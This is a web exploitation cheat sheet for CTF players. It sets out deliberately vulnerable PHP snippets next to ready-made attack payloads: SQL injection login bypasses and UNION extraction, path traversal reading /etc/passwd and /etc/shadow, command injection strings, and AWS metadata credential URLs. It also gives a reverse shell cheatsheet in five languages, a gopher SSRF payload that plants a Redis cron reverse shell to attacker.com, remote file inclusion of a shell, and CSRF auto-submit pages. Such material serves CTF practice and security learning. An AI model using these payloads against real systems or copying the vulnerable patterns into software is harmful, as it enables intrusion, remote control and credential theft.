Introduction to Web Exploitation

Web exploitation involves finding and leveraging vulnerabilities in web applications to gain unauthorized access or extract sensitive information.

Common vulnerabilities include:

  • SQL Injection (SQLi)
  • Cross-Site Scripting (XSS)
  • Path/Directory Traversal
  • Command Injection
  • Cross-Site Request Forgery (CSRF)
  • Server-Side Request Forgery (SSRF)
  • File Inclusion Vulnerabilities
  • cURL Exploitation
Note: This guide focuses on the most common web vulnerabilities found in CTF challenges.

SQL Injection (SQLi)

SQL injection is a code injection technique that exploits vulnerabilities in database queries.

Vulnerable PHP Code Example

// UNSAFE CODE - Vulnerable to SQLi $username = $_POST['username']; $password = $_POST['password']; $query = "SELECT * FROM users WHERE username='$username' AND password='$password'"; $result = mysqli_query($conn, $query);

Basic SQLi

# Bypass login with SQLi Username: admin' -- Password: [anything] # Alternative comment syntax Username: admin' /* Password: [anything] # Using OR condition Username: admin' OR '1'='1' -- Password: [anything] # MySQL specific Username: admin' # Password: [anything] # Always true condition ' OR '1'='1' -- " OR "" = "

Union-Based SQLi

# Find number of columns ' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- # If this fails, there are 2 columns # Union attack to retrieve data ' UNION SELECT username, password FROM users--
Show more Union-Based examples
# Find table names (MySQL) ' UNION SELECT 1,table_name FROM information_schema.tables-- # Find column names (MySQL) ' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'-- # Extract data from specific columns ' UNION SELECT 1,concat(username,':',password) FROM users-- # PostgreSQL version ' UNION SELECT NULL,version()-- # SQLite version ' UNION SELECT 1,sqlite_version()--

Blind SQLi

# Time-based blind SQLi '; IF (1=1) WAITFOR DELAY '0:0:5'-- '; IF (1=2) WAITFOR DELAY '0:0:5'-- # Boolean-based blind SQLi ' AND 1=1 -- (returns true) ' AND 1=2 -- (returns false)
Show more Blind SQLi examples
# Extract data character by character ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- # Conditional error ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)-- # MySQL blind with LIKE ' AND (SELECT password FROM users WHERE username='admin' AND password LIKE 'a%')='a # Oracle blind ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END FROM dual)=1--

Cross-Site Scripting (XSS)

XSS allows attackers to inject client-side scripts into web pages viewed by other users.

Vulnerable PHP Code Example

// UNSAFE CODE - Vulnerable to XSS $search = $_GET['search']; echo "<p>Search results for: " . $search . "</p>";

Path/Directory Traversal

Allows access to files and directories outside the web root directory.

Vulnerable PHP Code Example

// UNSAFE CODE - Vulnerable to Path Traversal $file = $_GET['file']; readfile('/var/www/html/' . $file);

Basic Examples

# Basic traversal http://example.com/getFile?filename=../../../../etc/passwd # URL encoded http://example.com/getFile?filename=%2e%2e%2f%2e%2e%2fetc%2fpasswd # Double encoding http://example.com/getFile?filename=%252e%252e%252f%252e%252e%252fetc%252fpasswd # Null byte injection (PHP < 5.3.4) http://example.com/getFile?filename=../../../../etc/passwd%00

Common Files to Access

  • /etc/passwd
  • /etc/shadow
  • /proc/self/environ
  • ../../../../../var/log/apache2/access.log
  • ../../../../../var/www/html/config.php
  • ../../../../../windows/win.ini
  • ../../../../../Windows/System32/drivers/etc/hosts

Command Injection

Allows execution of arbitrary commands on the host operating system.

Vulnerable PHP Code Example

// UNSAFE CODE - Vulnerable to Command Injection $ip = $_GET['ip']; system("ping -c 4 " . $ip);

Command Injection Examples

# Basic command injection ; ls -la ; cat /etc/passwd # Chaining commands && whoami | id # Background process ; nc -lvp 4444 & # Command substitution `whoami` $(whoami) # Newline injection 127.0.0.1%0Acat%20/etc/passwd

Reverse Shell Cheatsheet

# Bash bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 # Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' # Netcat nc -e /bin/sh 10.0.0.1 4242 # PHP php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");' # Perl perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Cross-Site Request Forgery (CSRF)

Forces an end user to execute unwanted actions on a web application.

Vulnerable PHP Code Example

// UNSAFE CODE - Vulnerable to CSRF if ($_POST['action'] == 'transfer') { $amount = $_POST['amount']; $to = $_POST['to']; transfer_money($amount, $to); }

Basic CSRF Example

<html> <body> <form action="http://vulnerable.com/transfer" method="POST">   <input type="hidden" name="action" value="transfer" />   <input type="hidden" name="amount" value="1000" />   <input type="hidden" name="to" value="attacker" /> </form> <script>   document.forms[0].submit(); </script> </body> </html>

CSRF Protection Bypass

# If CSRF token is checked but not validated properly <input type="hidden" name="csrf_token" value="fixed_value"> # If token is in cookie but not linked to session <img src="http://vulnerable.com/delete?csrf_token=123"> # If token is predictable <script> fetch('http://vulnerable.com/get_token') .then(r => r.text()) .then(token => { fetch('http://vulnerable.com/transfer', { method: 'POST', body: `amount=1000&to=attacker&csrf_token=${token}` }); }); </script>

Server-Side Request Forgery (SSRF)

SSRF allows an attacker to induce the server-side application to make requests to unintended locations.

Vulnerable PHP Code Example

// UNSAFE CODE - Vulnerable to SSRF $url = $_GET['url']; $content = file_get_contents($url); echo $content;

Basic SSRF Examples

# Access internal services http://vulnerable.com/load?url=http://localhost http://vulnerable.com/load?url=file:///etc/passwd # Using different protocols http://vulnerable.com/load?url=dict://attacker.com:1337/

Advanced SSRF Techniques

# Bypassing filters with encoding http://vulnerable.com/load?url=http://127.0.0.1@attacker.com http://vulnerable.com/load?url=http://2130706433/ (127.0.0.1 as integer) # Cloud metadata endpoints (AWS) http://vulnerable.com/load?url=http://169.254.169.254/latest/meta-data/
Show more SSRF examples
# Gopher protocol for SSRF to Redis http://vulnerable.com/load?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a # SSRF to internal services http://vulnerable.com/load?url=http://localhost:8080/admin http://vulnerable.com/load?url=http://127.0.0.1:3306 (MySQL) # SSRF with DNS rebinding http://vulnerable.com/load?url=http://attacker.com (with DNS TTL=0) # AWS metadata endpoints http://vulnerable.com/load?url=http://169.254.169.254/latest/meta-data/ http://vulnerable.com/load?url=http://169.254.169.254/latest/user-data/ http://vulnerable.com/load?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]

File Inclusion Vulnerabilities

File inclusion vulnerabilities allow attackers to include files on a web server through improper input validation.

Vulnerable PHP Code Example

// UNSAFE CODE - Vulnerable to File Inclusion $page = $_GET['page']; include('/var/www/html/' . $page . '.php');

Local File Inclusion (LFI)

# Basic LFI http://vulnerable.com/index.php?page=../../../../etc/passwd # Using PHP wrappers http://vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=index.php # Using /proc/self/environ http://vulnerable.com/index.php?page=../../../../proc/self/environ # Using PHP expect wrapper (if enabled) http://vulnerable.com/index.php?page=expect://ls

Remote File Inclusion (RFI)

# Basic RFI http://vulnerable.com/index.php?page=http://attacker.com/shell.txt # With PHP code execution http://vulnerable.com/index.php?page=http://attacker.com/shell.txt?&cmd=id

LFI to RCE Techniques

# Log poisoning nc -nv vulnerable.com 80 GET / HTTP/1.1 Host: vulnerable.com Then access: http://vulnerable.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id # PHP session file inclusion http://vulnerable.com/index.php?page=../../../../var/lib/php/sessions/sess_[sessionid] # Using /proc/self/fd/ (when file upload is available) 1. Upload a file containing PHP code 2. Include it via /proc/self/fd/[FD_NUMBER]

cURL Exploitation

cURL is a powerful command-line tool for transferring data with URLs. It can be used to test and exploit web vulnerabilities.

Basic cURL Usage

GET request:

curl http://example.com

POST request:

curl -X POST -d "username=admin&password=pass" http://example.com/login

With headers:

curl -H "User-Agent: Mozilla" -H "Accept: application/json" http://example.com

With cookies:

curl -b "session=abc123" http://example.com/dashboard

Exploiting Vulnerabilities with cURL

Testing for SQL Injection:

curl -X POST -d "username=admin'--&password=any" http://example.com/login

Testing for Command Injection:

curl "http://example.com/ping?ip=127.0.0.1;whoami"

Testing for SSRF:

curl "http://example.com/load?url=http://169.254.169.254/latest/meta-data/"

Testing for LFI:

curl "http://example.com/view?file=../../../../etc/passwd"
Show more cURL exploitation examples

Bypassing authentication:

curl -X POST -d "username=admin&password[$ne]=1" http://example.com/login

Exploiting JWT tokens:

curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." http://example.com/admin

Testing for XXE:

curl -X POST -H "Content-Type: application/xml" -d ' ]>&xxe;' http://example.com/xml

Exploiting HTTP Request Smuggling:

curl -X POST -H "Transfer-Encoding: chunked" -H "Content-Length: 4" -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n" http://example.com

Testing for Open Redirect:

curl -v "http://example.com/redirect?url=http://evil.com"

Testing for CRLF Injection:

curl -H "User-Agent: Mozilla\r\nX-Injected: header" http://example.com

Advanced cURL Techniques

Following redirects:

curl -L http://example.com

Saving cookies and reusing them:

# Save cookies curl -c cookies.txt http://example.com/login # Use cookies curl -b cookies.txt http://example.com/admin

Testing for CRLF Injection:

curl -H "User-Agent: Mozilla\r\nX-Injected: header" http://example.com

Testing for Open Redirect:

curl -v "http://example.com/redirect?url=http://evil.com"

Using proxy:

curl -x http://127.0.0.1:8080 http://example.com

Verbose output:

curl -v http://example.com

CTF Web Exploitation Tips

General CTF Strategy

  • Always view the page source (Ctrl+U or Right-click → View Page Source)
  • Check for hidden comments in HTML: <!-- secret: flag{...} -->
  • Inspect HTTP headers with browser dev tools or curl -v
  • Try common files: /robots.txt, /.git/, /backup.zip
  • Check for disabled JavaScript - some challenges require it to be off

Flag Formats

Flags can come in different formats. Common ones include:

flag{Th1s_1s_4_fl4g} FLAG{Th1s_1s_4_fl4g} CTF{Th1s_1s_4_fl4g} THM{Th1s_1s_4_fl4g} HTB{Th1s_1s_4_fl4g} [FLAG] Th1s_1s_4_fl4g [/FLAG]

Common Web CTF Challenges

  • Simple SQLi: Try basic SQL injection payloads on login/search forms
  • XSS Challenges: Often require stealing admin cookies or executing specific JS
  • File Upload: Try uploading PHP shells with different extensions
  • JWT Tampering: Change algorithm to "none" or crack weak secrets
  • Source Code Review: Check for hardcoded credentials or logic flaws

Useful Wordlists

# Common directories /usr/share/wordlists/dirb/common.txt /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt # Common files /usr/share/wordlists/dirb/common-files.txt # RockYou (for passwords) /usr/share/wordlists/rockyou.txt

Quick Checks

  • Try /admin, /backup, /flag endpoints
  • Check for .git directory exposure
  • Try HTTP methods: OPTIONS, PUT, DELETE
  • Test for IDOR by changing numeric IDs in URLs
  • Check for misconfigured CORS headers
